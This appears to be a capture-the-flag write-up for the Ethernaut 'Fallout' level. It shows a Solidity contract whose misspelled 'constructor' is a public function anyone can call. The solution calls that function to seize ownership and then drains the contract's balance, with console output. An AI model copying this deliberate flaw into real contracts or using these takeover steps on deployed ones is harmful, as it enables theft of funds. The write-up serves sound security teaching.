---
title: "Fal1Out"
tags: ["Constructor"]
reference: https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639
---

# Description

Claim ownership of the contract below to complete this level.

Things that might help

- Solidity Remix IDE

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

# Solution


1. found that anyone can call the "constructor"

- so anyone can change the ownership to himself

```
    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

2. become owner

```
contract.Fal1out()
Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
```

3. get contract balance

```
contract.collectAllocations()
Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
```

4. check contract balance

```
await getBalance(instance)
'0'
```
